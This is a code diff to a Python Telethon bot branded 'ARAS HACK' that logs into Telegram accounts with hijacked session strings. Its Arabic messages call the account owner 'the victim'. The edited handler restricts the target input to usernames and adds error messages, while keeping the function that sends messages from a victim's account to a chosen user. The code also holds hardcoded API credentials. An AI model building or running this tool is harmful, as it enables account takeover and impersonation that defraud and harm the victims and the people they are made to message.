@@ -662,10 +662,14 @@ async def send_to_specific_user(event):
         if not op:
             return await event.respond("**لقد تم انهاء جلسة هذا الكود من قبل الضحية**\n/hack", buttons=keyboard)
         
-        await x.send_message("**👤 أرسل لي يوزر أو ايدي الشخص:**\n\n"
-                           "**مثال اليوزر:** `@username`\n"
-                           "**مثال الايدي:** `123456789`")
+        await x.send_message("**👤 أرسل لي يوزر الشخص:**\n\n"
+                           "**يجب أن يبدأ بـ @**\n"
+                           "**مثال:** `@username`")
         user_target = await x.get_response()
+        
+        # التحقق من أن اليوزر يبدأ بـ @
+        if not user_target.text.startswith('@'):
+            return await event.respond("**❌ خطأ:** يجب أن يبدأ اليوزر بـ @\nمثال: `@username`", buttons=keyboard)
         
         await x.send_message("**💬 الآن أرسل الرسالة التي تريد إرسالها:**")
         message_text = await x.get_response()
@@ -675,13 +679,8 @@ async def send_to_specific_user(event):
         try:
             async with tg(ses(strses.text), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as client:
                 try:
-                    # التحقق من نوع المدخل (يوزر أو ايدي)
-                    if user_target.text.startswith('@'):
-                        # إذا كان يوزر
-                        user_entity = await client.get_entity(user_target.text)
-                    else:
-                        # إذا كان ايدي رقمي
-                        user_entity = await client.get_entity(int(user_target.text))
+                    # جلب معلومات المستخدم باستخدام اليوزر فقط
+                    user_entity = await client.get_entity(user_target.text)
                     
                     # إرسال الرسالة
                     await client.send_message(user_entity.id, message_text.text)
@@ -695,11 +694,11 @@ async def send_to_specific_user(event):
                                     f"**شكراً لأستخدامك ARAS HACK 🔰**", 
                                     buttons=keyboard)
                     
-                except ValueError:
-                    await event.reply("**❌ خطأ:** الرقم غير صحيح. تأكد من إدخال رقم ايدي صحيح.", buttons=keyboard)
                 except Exception as e:
-                    if "Could not find entity" in str(e):
-                        await event.reply("**❌ لم يتم العثور على المستخدم.**\nتأكد من اليوزر أو الايدي.", buttons=keyboard)
+                    if "Could not find entity" in str(e) or "No user has" in str(e):
+                        await event.reply("**❌ لم يتم العثور على المستخدم.**\nتأكد من اليوزر الصحيح.", buttons=keyboard)
+                    elif "The username is not occupied" in str(e):
+                        await event.reply("**❌ اليوزر غير موجود.**\nتأكد من كتابة اليوزر الصحيح.", buttons=keyboard)
                     else:
                         await event.reply(f"**❌ حدث خطأ:**\n`{str(e)}`", buttons=keyboard)
                         
